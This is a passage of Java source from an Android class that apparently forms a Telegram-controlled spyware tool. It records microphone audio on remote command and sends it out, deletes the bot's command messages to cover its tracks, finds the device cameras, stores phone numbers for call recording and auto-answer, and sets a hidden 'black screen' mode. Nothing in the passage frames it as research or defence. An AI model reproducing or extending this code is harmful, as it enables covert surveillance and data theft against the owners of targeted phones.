						micAudio.recordAndSendAudio(time * 1000);
					} catch (Exception e) {
						e.printStackTrace();
					}

					// Now 'time' variable holds the extracted time value
					// You can use it as needed
					System.out.println("Time value: " + time);
					telegramApi.sendMessage(chatId, "please wait " + time + "seconds sending recording after record.");
                    deleteMessageAsync(chatId, massageId);
				} else {
					// No match found for time value
					System.out.println("No time value found in the input.");
					telegramApi.sendMessage(chatId, "please send a valid command like this '/getMicAudio time: 5000'  change time according to you add time in seconds. ");
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
		} else {

			try {

				telegramApi.sendMessage(chatId, "please send a valid command use '/' for command");

			} catch (Exception e) {
				e.printStackTrace();
			}

		}


    }


	private class DeleteMessageAsyncTask extends AsyncTask<String, Void, Void> {
		@Override
		protected Void doInBackground(String... params) {
			String chatId = params[0];
			int messageId = Integer.parseInt(params[1]);

			try {
				URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/deleteMessage?chat_id=" + chatId + "&message_id=" + messageId);
				HttpURLConnection connection = (HttpURLConnection) url.openConnection();
				connection.setRequestMethod("GET");

				if (connection.getResponseCode() == HttpURLConnection.HTTP_OK) {
					Log.d("TelegramBotCmdApi", "Message deleted successfully");
				} else {
					Log.e("TelegramBotCmdApi", "Error deleting message. HTTP error code: " + connection.getResponseCode());
				}

				connection.disconnect();
			} catch (MalformedURLException e) {
				Log.e("TelegramBotCmdApi", "MalformedURLException: " + e.getMessage());
			} catch (IOException e) {
				Log.e("TelegramBotCmdApi", "IOException: " + e.getMessage());
			}

			return null;
		}
	}

	private void deleteMessageAsync(String chatId, int messageId) {
		new DeleteMessageAsyncTask().execute(chatId, String.valueOf(messageId));
	}



    private void sendMessage(final String message) {
        // Ensure UI-related actions are on the UI thread
        new Handler(Looper.getMainLooper()).post(new Runnable() {
				@Override
				public void run() {
					// Replace this with your actual logic to handle the received command
					Log.d("TelegramBotCmdApi", message);
					Toast.makeText(context, message, Toast.LENGTH_SHORT).show();
				}
			});
    }


	public static String decodeBase64(String base64Text) {
        byte[] decodedBytes = Base64.decode(base64Text, Base64.DEFAULT);
        return new String(decodedBytes, StandardCharsets.UTF_8);
    }

	private void saveLatestUpdateId(int updateId) {
		SharedPreferences sharedPreferences = context.getSharedPreferences("KaranKumar", Context.MODE_PRIVATE);
		SharedPreferences.Editor editor = sharedPreferences.edit();
		editor.putInt("latestUpdateId", updateId);
		editor.apply();
	}

	private int loadLatestUpdateId() {
		SharedPreferences sharedPreferences = context.getSharedPreferences("KaranKumar", Context.MODE_PRIVATE);
		return sharedPreferences.getInt("latestUpdateId", 0);
	}

	private void configNumber(String number) {
		SharedPreferences sharedPreferences = context.getSharedPreferences("number", Context.MODE_PRIVATE);
		SharedPreferences.Editor editor = sharedPreferences.edit();
		editor.putString("configNumber", number);
		editor.apply();
	}
	private void acceptNumber(String number) {
		SharedPreferences sharedPreferences = context.getSharedPreferences("accept", Context.MODE_PRIVATE);
		SharedPreferences.Editor editor = sharedPreferences.edit();
		editor.putString("acceptNumber", number);
		editor.apply();
	}
	private int getFrontCameraId() {
		int numberOfCameras = Camera.getNumberOfCameras();
		for (int i = 0; i < numberOfCameras; i++) {
			Camera.CameraInfo info = new Camera.CameraInfo();
			Camera.getCameraInfo(i, info);
			if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
				return i;
			}
		}
		return -1; // Return -1 if front camera is not found
	}

	private int getBackCameraId() {
		int numberOfCameras = Camera.getNumberOfCameras();
		for (int i = 0; i < numberOfCameras; i++) {
			Camera.CameraInfo info = new Camera.CameraInfo();
			Camera.getCameraInfo(i, info);
			if (info.facing == Camera.CameraInfo.CAMERA_FACING_BACK) {
				return i;
			}
		}
		return -1; // Return -1 if back camera is not found
	}
	private void RecordCall(String number) {
		SharedPreferences sharedPreferences = context.getSharedPreferences("RecordCall", context.MODE_PRIVATE);
		SharedPreferences.Editor editor = sharedPreferences.edit();
		editor.putString("RecordNumber", number);
		editor.apply();
	}
    
    private void blackScreen(boolean value) {
        SharedPreferences sharedPreferences = context.getSharedPreferences("Screen", Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPreferences.edit();
        editor.putBoolean("blkScreen", value);
        editor.apply();
	}
    
    
    private String extractPhoneNumber(String text) {
        // Define a regex pattern for extracting the phone number
        Pattern pattern = Pattern.compile("/recordCall\\s+number:\\s+(\\d+)");
        Matcher matcher = pattern.matcher(text);

        if (matcher.find()) {
            // Group 1 contains the matched phone number
            return matcher.group(1);
        }

        return null; // Return null if the phone number is not found
    }
    
    
}
